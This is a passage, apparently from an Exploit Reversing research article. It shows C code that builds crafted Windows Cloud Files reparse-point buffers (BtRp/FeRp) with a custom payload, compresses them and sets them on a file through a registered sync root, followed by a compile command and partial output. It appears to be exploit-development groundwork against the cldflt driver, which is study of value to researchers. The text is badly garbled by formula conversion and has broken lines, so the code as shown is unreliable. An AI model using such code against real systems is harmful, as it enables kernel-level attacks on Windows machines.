elements, unsigned short totalSize) { printf("\\n \[+\] BtRp header:\\n"); printf(" \[-\] $+ \\odot 4$ : magi $\\mathsf { C } = \\odot \\mathsf { X } \_ { , 0 } ^ { 0 / 2 } \\odot \\mathsf { B } \\mathsf { X } \\backslash \\mathsf { n } ^ { \\prime \\prime }$ , $\\star$ (const UINT $\\star$ )(buffer\_btrp $^ +$ BTRP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C } \\mathsf { r } \\mathsf { C } = \\odot \\times \_ { \\mathsf { \\Omega } ^ { \\prime } \\circ } ^ { \\circ \\prime } \\odot \\mathsf { 8 } \\times \\mathsf { \\Omega } \\mathsf { n } ^ { \\prime \\prime }$ , $\\star$ (const UINT\*)(buffer\_btrp $^ +$ BTRP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : ushortLen $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_LENGTH)); printf(" \[-\] $+ 1 9$ : flags $\\it { \\Omega } = \\odot \\times \\mathrm { \_ { / 0 } ^ { 0 / } \\odot 4 X \\backslash }$ n", $\\star$ (const USHORT $\\star$ )(buffer\_btrp $^ +$ BTRP\_FLAGS)); printf(" \[-\] $+ 1 2$ : numberOfElements $=$ %u\\n", $\\star$ (const USHORT\*)(buffer\_btrp $^ +$\
\
BTRP\_MAX\_ELEMS)); printf(" \[-\] totalSize $=$ %u\\n", totalSize); USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ count $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf $\\binom { 1 1 } { 3 } \\left\\lfloor \ n \\left\[ + \\right\] \\right.$ BtRpData base $=$ 0x%X\\n", base); for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i < count; i++) { printf(" \[-\] elements\[%d\]: type $=$ 0x%02X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); }\
\
}\
\
static void ValidateFeRp(const char $\\star$ buffer\_ferp, int count, const HSM\_ELEMENT\_INFO\*\
\
elements, unsigned short totalSize) { printf("\[+\] FeRp header:\\n"); printf(" \[-\] $+ \\odot \\Theta$ : version=0x%04X\\n", $\\star$ (const USHORT\*)(buffer\_ferp +\
\
FERP\_VERSION)); printf(" \[-\] $+ \\odot 2$ : structSize $=$ %u\\n", $\\star$ (const USHORT $\\star$ )(buffer\_ferp +\
\
FERP\_STRUCT\_SIZE)); printf(" \[-\] $+ \\odot 4$ : magi $\\mathsf { C } = \\odot \\mathsf { X } \_ { \\prime 0 } ^ { 0 \\prime } \\odot \\mathsf { { B } } \\mathsf { X } \\backslash \\mathsf { n } ^ { \\prime }$ ", $\\star$ (const UINT $\\star$ )(buffer\_ferp $^ +$ FERP\_MAGIC)); printf(" \[-\] $+ \\odot 8$ : $\\mathsf { C r C } = \\odot \\times \_ { \\mathscr { c } 0 } ^ { 0 \\prime } \\odot \\mathsf { B } \\times \\mathsf { \\langle n ^ { \\prime \\prime } }$ , $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_CRC)); printf(" \[-\] $+ \\odot \\zeta$ : dwordLen $=$ %u\\n", $\\star$ (const UINT\*)(buffer\_ferp $^ +$ FERP\_LENGTH)); printf(" \[-\] $+ 1 9$ : flags=0x%04X\\n", $\\star$ (const USHORT\*)(buffer\_ferp + FERP\_FLAGS)); printf(" \[-\] $+ 1 2$ : max\_elements $=$ %u\\n", \*(const USHORT\*)(buffer\_ferp +\
\
FERP\_MAX\_ELEMS)); printf("\[+\] Computed totalSize $=$ %u\\n", totalSize);\
\
// Remember: For FeRp, the format reserves 10 descriptors, even though we only use 5. USHORT base $=$ (USHORT)(HSM\_HEADER\_SIZE $^ +$ MAX\_ELEMS $\\star$ HSM\_ELEMENT\_INFO\_SIZE); printf("\\n\[+\] FeRpData base $= \\odot \\times \\mathrm { \_ { \\it { c 0 } } ^ { 0 \\prime } } \\mathrm { X }$ (reserved 10 descriptors)\\n", base); for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { printf(" \[-\] elements\[%d\]: typ $\\mathsf { \\Omega } \_ { = } ( 0 \\times \\mathsf { \\Omega } \_ { ^ { \\prime } 0 } ^ { 0 / } ( \\cdot ) 2 )$ X len $=$ %u off $\\underline { { \\underline { { \\mathbf { \\Pi } } } } }$ 0x%X\\n", i, elements\[i\].Type, elements\[i\].Length, elements\[i\].Offset); } }\
\
static USHORT BtRpBuildBuffer( HSM\_ELEMENT\_INFO\* elements, char\*\* input\_data, int count, char\* btrp\_data\_buffer\
\
) { memset(btrp\_data\_buffer, 0, BTRP\_BUFFER\_SIZE); $\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_MAGIC) $=$ HSM\_BITMAP\_MAGIC; // 0x70527442 $\\star ( \\mathsf { U S H O R T } \\star$ )(btrp\_data\_buffer $^ +$ BTRP\_MAX\_ELEMS) $=$ (USHORT)count; char $\\star$ ptr $=$ btrp\_data\_buffer $^ +$ HSM\_HEADER\_SIZE; for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { $\\star ( \\mathsf { U S H O R T } \\star )$ )(ptr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star \\left( \\mathsf { U S H O R T } \\star \\right)$ (ptr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star ( { \\sf U L O N G } \\star )$ (ptr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(btrp\_data\_buffer $^ +$ elements\[i\].Offset + 4, input\_data\[i\], elements\[i\].Length); ptr $+ =$ sizeof(HSM\_ELEMENT\_INFO); }\
\
USHORT max\_offset $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ;\
\
for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length) if (end $>$ max\_offset) { max\_offset $=$ end; }\
\
}\
\
USHORT total $=$ (USHORT)(max\_offset + 4);\
\
$\\star$ (USHORT\*)(btrp\_data\_buffer $^ +$ BTRP\_LENGTH) $=$ total;\
\
$\\star ( \\mathsf { U S H O R T } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC;\
\
if (total $< = ~ 8 ~ + ~ \\Theta \\times \\Theta C ,$ ) { printf("\[-\] BtRp size too small for CRC calc: 0x%X\\n", total); return 0;\
\
} ULONG crc\_len $=$ (ULONG)(total - 8);\
\
ULONG crc $=$ Calculate\_CRC32(0, btrp\_data\_buffer $^ +$ BTRP\_LENGTH, crc\_len);\
\
# [https://exploitreversing.com](https://exploitreversing.com/)\
\
$\\star ( { \\sf U L O N G } \\star )$ )(btrp\_data\_buffer $^ +$ BTRP\_CRC) $=$ crc;\
\
return total;\
\
tic USHORT FeRpBuildBuffer(\
\
HSM\_ELEMENT\_INFO\* elements,\
\
char\*\* input\_data,\
\
int count,\
\
char\* ferp\_ptr,\
\
USHORT max\_elements\
\
memset(ferp\_ptr, 0, FERP\_BUFFER\_SIZE);\
\
\*(USHORT\*)(ferp\_ptr $^ +$ FERP\_VERSION) $=$ VERSION\_VALUE;\
\
\*(USHORT\*)(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; // filled later\
\
\*(ULONG\*)(ferp\_ptr $^ +$ FERP\_MAGIC) $=$ HSM\_FILE\_MAGIC;\
\
\*(ULONG\*)(ferp\_ptr $^ +$ FERP\_LENGTH) $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; // dwordLen placeholder\
\
\*(USHORT\*)(ferp\_ptr $^ +$ FERP\_FLAGS) $=$ HSM\_DATA\_HAVE\_CRC;\
\
\*(USHORT\*)(ferp\_ptr $^ +$ FERP\_MAX\_ELEMS) $=$ max\_elements; // MAX\_ELEMS $=$ 10\
\
char\* descPtr $=$ ferp\_ptr $^ +$ HSM\_HEADER\_SIZE;\
\
for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { if ((size\_t)elements\[i\].Offset $^ +$ elements\[i\].Length $>$ FERP\_BUFFER\_SIZE) { printf("\[-\] FeRp element %d would overflow buffer (off $= \\Theta \\times ^ { 0 \\prime } \_ { ^ { 0 } } \\times$ , len $= \\odot \\times { } \_ { \\mathrm { \\scriptsize { \\mathscr { - } 0 } } } ^ { 0 \\prime } \\times$ )\\n", i, elements\[i\].Offset, elements\[i\].Length); return 0; } $\\star$ (USHORT\*)(descPtr $^ +$ ELEM\_TYPE) $=$ elements\[i\].Type; $\\star$ (USHORT $\\star$ )(descPtr $^ +$ ELEM\_LENGTH) $=$ elements\[i\].Length; $\\star$ (ULONG\*)(descPtr $^ +$ ELEM\_OFFSET) $=$ elements\[i\].Offset; memcpy(ferp\_ptr $^ +$ elements\[i\].Offset, input\_data\[i\], elements\[i\].Length); descPtr $+ =$ HSM\_ELEMENT\_INFO\_SIZE;\
\
}\
\
USHORT position\_limit $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ;\
\
for (int i $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; i $\\textless$ count; $\\dot { 7 } + +$ ) { USHORT end $=$ (USHORT)(elements\[i\].Offset $^ +$ elements\[i\].Length); if (end $>$ position\_limit) { position\_limit $=$ end; }\
\
}\
\
// Align to 8 bytes (FeRp requirement)\
\
USHORT rem $=$ (USHORT)(position\_limit % FERP\_ALIGN);\
\
if (rem $\\downarrow = \\textup { \\textsf { O } }$ ) { position\_limit $=$ (USHORT)(position\_limit $^ +$ (FERP\_ALIGN - rem));\
\
} if (position\_limit $>$ FERP\_BUFFER\_SIZE) { printf("\[-\] FeRp position\_limit size 0x%X exceeds buffer\\n", position\_limit); return 0; } \*(ULONG\*)(ferp\_ptr $^ +$ FERP\_LENGTH) $=$ (ULONG)(position\_limit - 4); if (position\_limit $< =$ HSM\_ELEMENT\_TYPE\_MAX) { printf("\[-\] FeRp position\_limit too small: 0x%X\\n", position\_limit); return 0; } // CRC covers \[ $\\Theta \\times \\Theta \ C$ .. StructSize), which is (StructSize - 12) bytes (check the\
\
reversed code) ULONG crc\_len $=$ (ULONG)(position\_limit - 8 - 4); ULONG crc $=$ Calculate\_CRC32(0, ferp\_ptr $^ +$ FERP\_LENGTH, crc\_len); $\\star$ (ULONG\*)(ferp\_ptr $^ +$ FERP\_CRC) $=$ crc; $\\star ( \\mathsf { U S H O R T } \\star )$ )(ferp\_ptr $^ +$ FERP\_STRUCT\_SIZE) $=$ position\_limit; return position\_limit;\
\
}\
\
typedef NTSTATUS(NTAPI\* PRtlGetCompressionWorkSpaceSize)( USHORT, PULONG, PULONG);\
\
typedef NTSTATUS(NTAPI\* PRtlCompressBuffer)( USHORT, PUCHAR, ULONG, PUCHAR, ULONG, ULONG, PULONG, PVOID);\
\
static unsigned long FeRpCompressBuffer(char\* input\_buffer, unsigned short input\_size,\
\
char\* output\_buffer) { HMODULE h\_Ntdll $=$ LoadLibraryW(L"ntdll.dll"); if (!h\_Ntdll) return 0; auto h\_CompressionWSS $=$ (PRtlGetCompressionWorkSpaceSize)GetProcAddress(h\_Ntdll,\
\
"RtlGetCompressionWorkSpaceSize"); auto h\_CompressBuffer $=$ (PRtlCompressBuffer)GetProcAddress(h\_Ntdll,\
\
"RtlCompressBuffer"); if (!h\_CompressionWSS \|\| !h\_CompressBuffer) { FreeLibrary(h\_Ntdll); return 0; } ULONG ws1 $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ , $\\mathsf { w } \\mathsf { s } 2 \\mathrm { ~ ~ { ~ = ~ \\mathrm { ~ \\odot ~ } ~ } ~ }$ ; if (h\_CompressionWSS(2, &ws1, &ws2) != 0) { FreeLibrary(h\_Ntdll); return 0; } std::unique\_ptr<char\[\]> workspace(new char\[ws1\]); ULONG finalCompressedSize $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; // Compress from input\_buffer $^ +$ 4 (skipping Version+StructSize, which are checked\
\
only by HsmpRpValidateBuffer routine) NTSTATUS st $=$ h\_CompressBuffer(\
\
2, (PUCHAR)(input\_buffer $^ +$ 4), (ULONG)(input\_size - 4), (PUCHAR)output\_buffer, (ULONG)FERP\_BUFFER\_SIZE, FERP\_BUFFER\_SIZE, &finalCompressedSize, workspace.get() );\
\
FreeLibrary(h\_Ntdll); if (st ! $\\downarrow = \\textup { \\textsf { O } }$ ) return 0; return finalCompressedSize; }\
\
static int BuildAndSetCloudFilesReparsePoint(HANDLE hFile, int payload\_size, char\* payload\_buf) {\
\
const int BT\_COUNT $=$ ELEMENT\_NUMBER; // 5 elements (only what is necessary for our experiment) auto bt\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (BT\_COUNT);\
\
bt\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[1\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
bt\_elements\[2\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
bt\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
bt\_elements\[3\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
bt\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
bt\_elements\[4\].Length $=$ (USHORT)payload\_size;\
\
// BtRp payload starts at $\\Theta \\times 6 \\Theta$ (it is imposed by FeRp structure with 10 possible elements).\
\
// Here we have a 4-byte alignment between elements bt\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET; bt\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ bt\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ bt\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ bt\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$\
\
std::unique\_ptr<char\[\]> bt\_buf(new char\[BTRP\_BUFFER\_SIZE\]);\
\
memset(bt\_buf.get(), 0, BTRP\_BUFFER\_SIZE); BYTE bt\_data\_00 $=$ $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_01 = $\\Theta \\times \\Theta 1$ ;\
\
BYTE bt\_data\_02 = $\\Theta \\times \\Theta \\Theta$ ;\
\
UINT64 bt\_data\_03 $=$ $\\Theta \\times$ ABCDABCDABCDABCD;\
\
char\* bt\_data\[BT\_COUNT\] $=$ { (char\*)&bt\_data\_00, (char\*)&bt\_data\_01, (char\*)&bt\_data\_02, (char\*)&bt\_data\_03, payload\_buf\
\
};\
\
USHORT bt\_buffer\_size $=$ BtRpBuildBuffer(bt\_elements.get(), bt\_data, BT\_COUNT, bt\_buf.get());\
\
if (bt\_buffer\_size $\\begin{array} { r l } { \\mathbf { \\Sigma } = = } & { { } \\odot } \\end{array}$ ) { printf("\[-\] BtRpBuildBuffer failed\\n"); return -1;\
\
} printf("\[+\] BtBufferSize: $\\Theta \\times \_ { ^ { \\prime 0 } } ^ { 0 \\prime } \\Theta 4 \\times \\sin ^ { \\prime \\prime }$ , bt\_buffer\_size);\
\
ValidateBtRp(bt\_buf.get(), BT\_COUNT, bt\_elements.get(), bt\_buffer\_size);\
\
const int FE\_COUNT $=$ ELEMENT\_NUMBER; // 5 used elements auto fe\_elements $=$ std::make\_unique<HSM\_ELEMENT\_INFO\[\] $>$ (FE\_COUNT);\
\
fe\_elements\[0\].Type $=$ HSM\_ELEMENT\_TYPE\_BYTE;\
\
fe\_elements\[0\].Length $\\begin{array} { r l r } { \\mathrm { ~ ~ \\omega ~ } } & { { } = } & { \\odot \\times \\perp } \\end{array}$ ;\
\
fe\_elements\[1\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT32;\
\
fe\_elements\[1\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[2\].Type $=$ HSM\_ELEMENT\_TYPE\_UINT64;\
\
fe\_elements\[2\].Length $ \\quad = \\quad \\odot \\times 8 \\quad$ ;\
\
fe\_elements\[3\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[3\].Length $= ~ \\odot \\times 4$ ;\
\
fe\_elements\[4\].Type $=$ HSM\_ELEMENT\_TYPE\_BITMAP;\
\
fe\_elements\[4\].Length $=$ bt\_buffer\_size;\
\
// FeRp payload also starts at $\\Theta \\times 6 \\Theta$ ; we only use 5 elements, but the format reserves 10 slots.\
\
fe\_elements\[0\].Offset $=$ ELEMENT\_START\_OFFSET;\
\
fe\_elements\[1\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ;\
\
fe\_elements\[2\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta 8$ ;\
\
fe\_elements\[3\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ;\
\
fe\_elements\[4\].Offset $=$ ELEMENT\_START\_OFFSET $^ +$ $\\Theta \\times \\bot 8$ ; // BtRp blob std::unique\_ptr<char\[\]> fe\_buf(new char\[FERP\_BUFFER\_SIZE\]);\
\
memset(fe\_buf.get(), 0, FERP\_BUFFER\_SIZE); BYTE fe\_data\_00 $=$ $\\Theta \\times 9 9$ ;\
\
UINT32 fe\_data\_01 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot \\odot \\odot 1$ ;\
\
UINT64 fe\_data\_02 $=$ $\\Theta \\times \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\Theta \\odot \\odot \\downarrow$ ;\
\
UINT32 fe\_data\_03 $=$ $\\Theta \\times \\odot \\odot \\odot \\odot \\odot 3 3$ ;\
\
char\* fe\_data\[FE\_COUNT\] $=$ { (char\*)&fe\_data\_00, (char\*)&fe\_data\_01, (char\*)&fe\_data\_02, (char\*)&fe\_data\_03, bt\_buf.get()\
\
};\
\
USHORT fe\_size $=$ FeRpBuildBuffer(fe\_elements.get(), fe\_data, FE\_COUNT, fe\_buf.get(), MAX\_ELEMS); if (fe\_size $\\mathrm { \\Omega } = \\mathrm { \\Omega } \\left. { \\mathrm { \\Omega } } \\right.$ ) { printf("\[-\] FeRpBuildBuffer failed\\n"); return -1; }\
\
printf $\\binom { 1 1 } { 3 } \\boxed { 1 } \\boxed { + }$ FeRp size: 0x%04X\\n", fe\_size);\
\
ValidateFeRp(fe\_buf.get(), FE\_COUNT, fe\_elements.get(), fe\_size); std::unique\_ptr<char\[\]> compressed(new char\[COMPRESSED\_SIZE\]); memset(compressed.get(), 0, COMPRESSED\_SIZE); unsigned long compressed\_size $=$ FeRpCompressBuffer(fe\_buf.get(), fe\_size,\
\
compressed.get()); if (compressed\_size $= =$ 0 \|\| compressed\_size $>$ COMPRESSED\_SIZE) { printf("\[-\] Compression failed or output too large (%lu bytes)\\n",\
\
compressed\_size); return -1; } printf("\[+\] Compressed FeRp size: $\\Theta \\times { } \_ { \\prime 0 } ^ { 0 \\prime }$ lX\\n", compressed\_size); USHORT cf\_payload\_len $=$ (USHORT)(4 $^ +$ compressed\_size); std::unique\_ptr<char\[\]> cf\_blob(new char\[cf\_payload\_len\]); memset(cf\_blob.get(), 0, cf\_payload\_len); $\\star$ (USHORT\*)(cf\_blob.get() + 0) $=$ $\\Theta \\times 8 \\Theta \\Theta 1$ ; // CompressionFlag (compressed) \*(USHORT\*)(cf\_blob.get() + 2) $=$ fe\_size; // Uncompressed FeRp size memcpy(cf\_blob.get() + 4, compressed.get(), compressed\_size); REPARSE\_DATA\_BUFFER\_EX rep\_data\_buffer\_ex{}; rep\_data\_buffer\_ex.Flags $=$ $\\Theta \\times 1$ ; rep\_data\_buffer\_ex.ExistingReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ExistingReparseGuid $=$ ProviderId; rep\_data\_buffer\_ex.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseTag $=$ IO\_REPARSE\_TAG\_CLOUD\_6; rep\_data\_buffer\_ex.ReparseDataBuffer.ReparseDataLength $=$ cf\_payload\_len; rep\_data\_buffer\_ex.ReparseDataBuffer.Reserved $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; memcpy(rep\_data\_buffer\_ex.ReparseDataBuffer.GenericReparseBuffer.DataBuffer,\
\
cf\_blob.get(), cf\_payload\_len); DWORD inSize $=$ (DWORD)( offsetof(REPARSE\_DATA\_BUFFER\_EX,\
\
ReparseDataBuffer.GenericReparseBuffer.DataBuffer) + cf\_payload\_len ); DWORD bytesReturned $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; BOOL ok $=$ DeviceIoControl( hFile, FSCTL\_SET\_REPARSE\_POINT\_EX, &rep\_data\_buffer\_ex, inSize, NULL, 0, &bytesReturned, NULL ); if (!ok) { printf("\[-\] FSCTL\_SET\_REPARSE\_POINT\_EX failed! error $=$ %lu\\n", GetLastError return -1; } printf("\\n\[+\] DeviceIoControl (FSCTL\_SET\_REPARSE\_POINT\_EX) succeeded (file)\\n" std::unique\_ptr<BYTE\[\]> q(new BYTE\[REPARSE\_DATA\_SIZE\]); DWORD outBytes $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if (DeviceIoControl(hFile, FSCTL\_GET\_REPARSE\_POINT, NULL, 0, q.get(),\
\
REPARSE\_DATA\_SIZE, &outBytes, NULL)) { auto reparsepoint $=$ reinterpret\_cast(q.get()); printf("\[+\] GET\_REPARSE (file): t $\\mathrm { \\partial } \\cdot \\mathrm { \\partial } \\mathrm { \\partial } \\mathrm { \\partial } \\cdot \\mathrm { \\partial } \\Theta \\mathrm { \\partial } \\Theta \\mathrm { \\partial }$ lX, len $= % 1$ , total $=$ %lu\\n", reparsepoint->ReparseTag, reparsepoint->ReparseDataLength, (unsigned\
\
long)outBytes); } else { printf("\[-\] GET\_REPARSE (file) failed: %lu\\n", GetLastError()); } return 0;\
\
}\
\
int wmain(void) { PWSTR appDataPath $=$ NULL; HRESULT hrPath $=$ SHGetKnownFolderPath(FOLDERID\_RoamingAppData, 0, NULL,\
\
&appDataPath); if (FAILED(hrPath)) { wprintf(L"Failed to resolve %%APPDATA%%. HRESULT: 0x%08lX\\n", (unsigned\
\
long)hrPath); return -1; } wchar\_t syncRootPath\[MAX\_PATH\]; swprintf(syncRootPath, MAX\_PATH, L"%s\\MySyncRoot", appDataPath); CreateDirectoryW(syncRootPath, NULL); wprintf(L"\[+\] Sync root directory ensured: %s\\n", syncRootPath); LPCWSTR identityStr $=$ L"Alexandre"; CF\_SYNC\_REGISTRATION registration{}; registration.StructSize $=$ sizeof(registration); registration.ProviderName $=$ L" $\\mathsf { E x }$ ploitReversing"; registration.ProviderVersion $=$ L"1.0.0"; registration.ProviderId $=$ ProviderId; registration.SyncRootIdentity $=$ identityStr; registration.SyncRootIdentityLength $=$ (ULONG)(lstrlenW(identityStr) \*\
\
sizeof(WCHAR)); CF\_SYNC\_POLICIES policies{}; policies.StructSize $=$ sizeof(policies); policies.Hydration.Primary $=$ CF\_HYDRATION\_POLICY\_FULL; policies.Population.Primary $=$ CF\_POPULATION\_POLICY\_PARTIAL; policies.HardLink $=$ CF\_HARDLINK\_POLICY\_ALLOWED; policies.PlaceholderManagement $=$\
\
CF\_PLACEHOLDER\_MANAGEMENT\_POLICY\_UPDATE\_UNRESTRICTED; HRESULT hrReg $=$ CfRegisterSyncRoot(syncRootPath, &registration, &policies, CF\_REGISTER\_FLAG\_DISABLE\_ON\_DEMAND\_POPULATION\_ON\_ROOT); if (FAILED(hrReg)) { wprintf(L"\[-\] Sync root registration failed: $\\Theta \\times { } \_ { \\prime 0 } ^ { 0 \\prime } \\Theta ,$ 8lX\\n", (unsigned long)hrReg); CoTaskMemFree(appDataPath); return -1;\
\
}\
\
wprintf(L"\[+\] Sync root registered at %s\\n", syncRootPath); wchar\_t filePath\[MAX\_PATH\]; swprintf(filePath, MAX\_PATH, L"%s\\ers06", syncRootPath); DWORD attrs $=$ GetFileAttributesW(filePath); if (attrs ! $=$ INVALID\_FILE\_ATTRIBUTES) { SetFileAttributesW(filePath, FILE\_ATTRIBUTE\_NORMAL); if (!DeleteFileW(filePath)) { wprintf(L"\[-\] Failed to delete existing file: %s (Error %lu)\\n", filePath, GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[i\] $\\mathsf { E x }$ isting file deleted: %s\\n", filePath); } HANDLE hFile $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE, NULL, CREATE\_NEW, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Failed to create file: %s (Error %lu)\\n", filePath, GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] File created: %s\\n", filePath); std::unique\_ptr<char\[\]> payload(new char\[PAYLOAD\_SIZE\]); memset(payload.get(), PAYLOAD\_INITIAL\_BYTE, PAYLOAD\_OFFSET); $\\star ( \\mathsf { U I N T } \\star$ )(payload.get() $^ +$ PAYLOAD\_OFFSET) $=$ $\\Theta \\times$ DEADBEEF; $\\star \\left( \\mathsf { U I N T } \\star \\right)$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta 4$ ) $=$ 0x12345678; $\\star \\left( \\mathsf { U I N T } \\star \\right)$ (payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ 8 $ ) $=$ 0xABCDEF00; $\\star ( \\mathsf { U I N T } \\star )$ )(payload.get() $^ +$ PAYLOAD\_OFFSET $^ +$ $\\Theta \\times \\Theta \ C$ ) $=$ 0xC0DEC0DE; int rc $=$ BuildAndSetCloudFilesReparsePoint(hFile, PAYLOAD\_SIZE, payload.get()); if ( ${ \\mathsf { r c } } \\quad ! = \\quad \\Theta \_ { }$ ) { wprintf(L"\[-\] BuildAndSetCloudFilesReparsePoint failed\\n"); } CloseHandle(hFile); printf("\[+\] Opening file again to check the file\\n"); HANDLE hFile1 $=$ CreateFileW( filePath, GENERIC\_ALL, FILE\_SHARE\_READ \| FILE\_SHARE\_WRITE \| FILE\_SHARE\_DELETE,\
\
NULL, OPEN\_EXISTING, FILE\_ATTRIBUTE\_NORMAL, NULL ); if (hFile1 $= =$ INVALID\_HANDLE\_VALUE) { wprintf(L"\[-\] Open file failed! error $=$ %lu\\n", GetLastError()); CfUnregisterSyncRoot(syncRootPath); CoTaskMemFree(appDataPath); return -1; } wprintf(L"\[+\] File reopened successfully, handle $=$ %p\\n", hFile1); CloseHandle(hFile1); printf("\[i\] File handle closed again\\n"); CfUnregisterSyncRoot(syncRootPath); wprintf(L"\[i\] Sync root unregistered. File left in place: %s\\n", filePath); CoTaskMemFree(appDataPath); return $r c = 0$ ) ? 0 : 1;\
\
If you want to compile this program with Visual Studio Code, execute:\
\
▪ cl /TP /Fe:reparse\_point.exe reparse\_point.c /link Cldapi.lib Ole32.lib Shell32.lib\
\
After compiling the code on Visual Studio and run it, the output follows:\
\
C:\\Users\\Administrator\\Desktop\\RESEARCH>reparse\_point.exe $\[ + \]$ Sync root directory ensured: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot $\[ + \]$ Sync root registered at C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot \[i\] Existing file deleted: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 $\[ + \]$ File created: C:\\Users\\Administrator\\AppData\\Roaming\\MySyncRoot\\ers06 $\[ + \]$ BtBufferSize: $\\Theta \\times \\Theta 2 8 \\mathsf { C }$\
\
